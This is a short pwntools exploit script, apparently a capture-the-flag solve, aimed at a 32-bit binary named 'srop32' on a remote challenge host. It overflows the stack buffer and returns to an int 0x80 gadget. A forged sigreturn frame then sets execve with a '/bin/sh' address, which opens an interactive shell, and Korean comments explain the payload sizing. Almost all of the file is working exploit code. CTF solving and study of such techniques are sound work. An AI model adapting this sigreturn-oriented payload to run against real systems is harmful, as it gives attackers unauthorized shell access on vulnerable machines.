from pwn import *
p = remote("realsung.kr", 13337)
# p = process('./srop32')
e = ELF("./srop32")

sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
rvu = lambda x : p.recvuntil(x)

int80 = 0x0804848E
binsh = 0x08048560

payload = b''
payload += b'A' * (0x8 + 0x4) # buf + sfp
payload += p32(int80) # ret

frame = SigreturnFrame(kernel='amd64') 
frame.eax = 0xb
frame.ebx = binsh
frame.eip = int80

payload += bytes(frame) # sigreturn
payload += b'C' * (119 - len(payload)) # 119개에서 나머지 넣기 

pause() 
s(payload) # 주의 sendline으로 보내면 엔터가 하나 포함된걸로 보여서 119개가 아니라 118개를 넣어야함


p.interactive()